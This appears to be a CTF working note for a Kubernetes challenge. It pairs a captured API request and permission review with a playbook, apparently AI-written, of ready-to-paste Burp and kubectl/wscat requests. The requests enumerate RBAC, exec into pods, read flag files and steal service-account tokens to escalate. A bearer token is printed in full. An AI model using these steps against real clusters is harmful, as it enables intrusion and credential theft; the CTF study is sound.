**

# **Scope:**

[https://spelunk8ing.chals.damctf.xyz:6443/](https://spelunk8ing.chals.damctf.xyz:6443/)

[https://spelunk8ing.chals.ctfstaging.detjens.dev:6443/](https://spelunk8ing.chals.ctfstaging.detjens.dev:6443/)

  

# **Scheme:**

https://www.plantuml.com/plantuml/uml/VPNFRXCn4CRl-nIZN0f8QKaf4ie1DKil5QX4BHmGGiZPdMHDlBQnlVbJLAdqm8K3py0RLAY8gXNm2jutmfkmLTFPDfTuVzytuq-ZjNVREcPSaOl8SISGOi6IyK3Du7anG2FHeOLdeh0E3UnmcwW9cZdSwmSRPagaQEv7aHrpgPbXEGWUIkOQGHcNgMk2pLYgfboEOCY4nMjAYaDM2FSAPwud-4ZcA1qaA1sQAD8X3HiXjAn6KSZnaz2XpjE2Jr44S6NPxQ_PYa7u9IhNIbQTMYdB4pS4hhlmU6jzixErtjdQNEyyUjW2Pc6ttxbP4DpMiL7OwVQYpL1qLEtE4gSCjBHWSpGBiR1etY-VL-999VVHgi8a-7h_HLFI3QPvgmbkF6Z4jfaskJDamcM7L11yWWrOQPGqJIqq9pB8qdb3hmaQovMyLTYebAELMUsn76rumgOnCQ4pHheD39ieGfEC6S6Hy1I5epqmoMYBePevenpX8oM616RAeI2KovJJtJuKWYFjE-P2KLWCi6tdrc5EDC5psZpdOoHmJqqm7w0XmakRC4erqxJnnm87c12yhtAaiGyu6aDxE2P7r5n8FbGc9tp2gpD6y3JZTenpmcU6KVY6oJ4YmOU5AEvu-xgmc7jrefjUn1tKGitpQjrR7FqKTUyEKroRufkclagXrrd8MgMzJfCUN-anqG_GX2dX_nXsalHkSyIr8uugoo8ojDjFb_j25t8csGXjBSQr6DyKGu_LIgCAXnQSgkNLsYkvdlSQ-E_-eZmklvOd_hJy1kNdygGyzZ_zfR_mf-3F_6MW_g__ut_vy_ABFm-hts5r7Fv_-DDg7GpBktRfEuFgAn11TKL3ErLJ-JRZQOhoNKYoUZDVVwo2BaVH1IuT6fOu2rFkicPVJ7r7qJRAjFgG_WC0

  


  

## **In burp:**  
```
`POST /apis/authorization.k8s.io/v1/selfsubjectrulesreviews HTTP/2`

`Host: spelunk8ing.chals.ctfstaging.detjens.dev:6443`

`Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IkU3WnpGdzBrZ2N4QkdFWml6MTU2LWhHX2RpcWMxanB2eWplQ0NpNnNFSWMifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXVzZXJzIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6InBsYXllci10b2tlbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJwbGF5ZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI0NDBmNTY4Yi02YTYxLTQ0ZTQtOTc2Zi1jZTlkODkxMTk4ZDkiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS11c2VyczpwbGF5ZXIifQ.OIgHcMM3wTGFOmbbftMFcbDpbfmeBeLg2_datyf6BOK0_tTsAUwdbciy31OdTQ1632pMurgvSv4KUkbCOqZufh1T-4XonLD2Eov0jHmsGTJYmH73aLQpSaYrFWaxdaxb0bNXyLIBaqCTJImw6TlinVVZmADnNGpAkM5U9MdhshelXrjfJ-M_Fhmxh3bZg594rGr6jj7o35wAZ9BeeERHfKYIqVvFCV38SX6cIlIT6xMdo3gl9CQls43hYlK0SVABWRMm2a5Zi7XqYa9Z4hYyTnZMWplqaNgoeQblzMhmuqbx-K0y-Tkw7U3Yca39HqsBBM-D8qFXeyx9Os5RnFupjg`

`Content-Type: application/json`

`Content-Length: 133`

  

`{`

  `"kind": "SelfSubjectRulesReview",`

  `"apiVersion": "authorization.k8s.io/v1",`

  `"spec": {`

    `"namespace": "default"`

  `}`

`}`
```

  

## **Resulted with:**

  

```
`HTTP/2 201 Created`

`Audit-Id: 270c1e0b-0a46-4243-9f62-fdf0289f2c48`

`Cache-Control: no-cache, private`

`Content-Type: application/json`

`X-Kubernetes-Pf-Flowschema-Uid: 05301eb2-eec8-4686-a847-dd7aeb3ff25f`

`X-Kubernetes-Pf-Prioritylevel-Uid: 96346bad-735f-4abf-802c-2861ed05d409`

`Content-Length: 1082`

`Date: Sat, 10 May 2025 11:21:51 GMT`

  

`{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","metadata":{"creationTimestamp":null},"spec":{},"status":{"resourceRules":[{"verbs":["create"],"apiGroups":["authorization.k8s.io"],"resources":["selfsubjectaccessreviews","selfsubjectrulesreviews"]},{"verbs":["create"],"apiGroups":["authentication.k8s.io"],"resources":["selfsubjectreviews"]},{"verbs":["list","get"],"apiGroups":[""],"resources":["serviceaccounts"]},{"verbs":["list","get"],"apiGroups":["rbac.authorization.k8s.io"],"resources":["roles","rolebindings","clusterroles","clusterrolebindings"]},{"verbs":["list","get","exec"],"apiGroups":[""],"resources":["pods"]}],"nonResourceRules":[{"verbs":["get"],"nonResourceURLs":["/api","/api/*","/apis","/apis/*","/healthz","/livez","/openapi","/openapi/*","/readyz","/version","/version/"]},{"verbs":["get"],"nonResourceURLs":["/.well-known/openid-configuration","/.well-known/openid-configuration/","/openid/v1/jwks","/openid/v1/jwks/"]},{"verbs":["get"],"nonResourceURLs":["/healthz","/livez","/readyz","/version","/version/"]}],"incomplete":false}}`
```
## **PLAN**
Below is a **step-by-step discovery playbook** that uses **only the permissions your `SelfSubjectRulesReview` showed**:

* `list / get`   →  pods, serviceaccounts, roles, rolebindings, clusterroles, clusterrolebindings
* `exec`   →  pods
* `create` → selfsubject access/rules/reviews (for permission tests)

No other verbs are allowed, so we’ll squeeze all we can out of **list + exec**.

All examples are **ready-to-paste into Burp Repeater**; just change `<ns>`, `<pod>`, or the host if you switch back to the staging endpoint.

---

## 1 — Confirm namespace where rights apply

Your first review was for `default`.
Run the same review against `kube-users` (and any other namespace names you guess, e.g. `kube-system`, `kube-public`).

```http
POST /apis/authorization.k8s.io/v1/selfsubjectrulesreviews HTTP/1.1
Host: spelunk8ing.chals.damctf.xyz:6443
Authorization: Bearer <token>
Content-Type: application/json
Content-Length: 95

{
  "kind":"SelfSubjectRulesReview",
  "apiVersion":"authorization.k8s.io/v1",
  "spec":{"namespace":"kube-users"}
}
```

*If the response shows the same `list/get/exec` verbs, continue below with that namespace; if not, stick to `default`.*

---

## 2 — List objects you can see

### 2-A Pods

```http
GET /api/v1/namespaces/<ns>/pods HTTP/1.1
Host: spelunk8ing.chals.damctf.xyz:6443
Authorization: Bearer <token>
Accept: application/json
```

Look for pod names; note the `containerStatuses[].name` if there is more than one container.

### 2-B ServiceAccounts

```http
GET /api/v1/namespaces/<ns>/serviceaccounts HTTP/1.1
Host: spelunk8ing.chals.damctf.xyz:6443
Authorization: Bearer <token>
Accept: application/json
```

### 2-C RBAC objects (in-namespace and cluster-wide)

```http
# Roles
GET /apis/rbac.authorization.k8s.io/v1/namespaces/<ns>/roles HTTP/1.1
Host: spelunk8ing.chals.damctf.xyz:6443
Authorization: Bearer <token>
Accept: application/json

# RoleBindings
GET /apis/rbac.authorization.k8s.io/v1/namespaces/<ns>/rolebindings HTTP/1.1
...

# ClusterRoles
GET /apis/rbac.authorization.k8s.io/v1/clusterroles HTTP/1.1
...

# ClusterRoleBindings
GET /apis/rbac.authorization.k8s.io/v1/clusterrolebindings HTTP/1.1
...
```

👉 **Why bother with Roles/Bindings?**
Even though you can’t create new bindings, you might spot an **existing binding** that gives one of the pods a high-privilege service-account. We’ll harvest its token in Step 3.

---

## 3 — Exec into each pod

`exec` is a WebSocket-upgrade endpoint. Burp Repeater can handle it:

1. **Repeater → right-click → “Change request type → WebSocket”.**
2. Paste this request line (no body):

```
GET /api/v1/namespaces/<ns>/pods/<pod>/exec?container=<container>&command=sh&command=-c&command=id;hostname;cat%20/flag.txt&stdin=false&stderr=true&stdout=true&tty=false HTTP/1.1
Host: spelunk8ing.chals.damctf.xyz:6443
Authorization: Bearer <token>
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Key: dGVzdGtleQ==
Sec-WebSocket-Version: 13
```

3. Hit **Send**.
   *If the handshake is accepted you’ll see `HTTP/1.1 101 Switching Protocols`. The shell output appears in the WebSocket messages.*

### What to look for inside the pod

* `/flag`, `/flag.txt`, `/root/flag`, `env | grep FLAG`
* `/var/run/secrets/kubernetes.io/serviceaccount/token`
  (copy it out and use it in Burp as the **Authorization** header for new requests; it might have broader permissions)
* Mounted ConfigMaps or volumes with obvious flag names

---

## 4 — Iterate through namespaces

If `list pods` fails for another namespace, double-check with a **SelfSubjectRulesReview** for that namespace.
Sometimes CTF clusters grant `list/get` in **all** namespaces even when the review was requested for just one.

```http
POST /apis/authorization.k8s.io/v1/selfsubjectrulesreviews HTTP/1.1
...
{ "kind":"SelfSubjectRulesReview", "apiVersion":"authorization.k8s.io/v1", "spec":{"namespace":"kube-system"} }
```

If the review comes back with the same verbs, repeat Steps 2–3 for that namespace.

---

## 5 — If no flag yet: harvest higher-privilege tokens

1. From every pod you can `exec` into, read its token:
   `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
2. Paste that token into Burp **instead of** your original token.
3. Immediately request `/version` (quick sanity check).
4. Re-run the same enumeration calls with the new token.
   A pod running as `kube-system` or `default` service-account might have broader RBAC and expose the flag elsewhere.

---

## 6 — Shortcut helpers (optional)

If Burp’s WebSocket flow feels clunky, you can:

* Use **`wscat`**:

  ```bash
  wscat -c "wss://spelunk8ing.chals.damctf.xyz:6443/api/v1/namespaces/<ns>/pods/<pod>/exec?container=<container>&stdin=0&stderr=1&stdout=1&command=cat&command=/flag.txt"
  ```
* Or run `kubectl` against the same API by pointing `$KUBECONFIG` to the snippet you pasted (token + server).
  `kubectl --insecure-skip-tls-verify --token="$TOKEN" --server=https://spelunk8ing.chals.damctf.xyz:6443 -n <ns> exec -it <pod> -- sh`

Either way the key idea is: **list → identify → exec → dump token / flag**.

---

### Recap

| Goal                     | Exact action                                                 |
| ------------------------ | ------------------------------------------------------------ |
| Confirm namespace rights | `SelfSubjectRulesReview` per namespace                       |
| Enumerate                | `GET /pods`, `/serviceaccounts`, `/roles`, …                 |
| Pivot / flag hunt        | WebSocket `exec` into every pod                              |
| Escalate                 | Steal service-account tokens from inside pods and reuse them |

Stay systematic: keep notes of every pod, its SA, and what you dump.
A single privileged pod is usually all it takes to reach the flag.



  
**
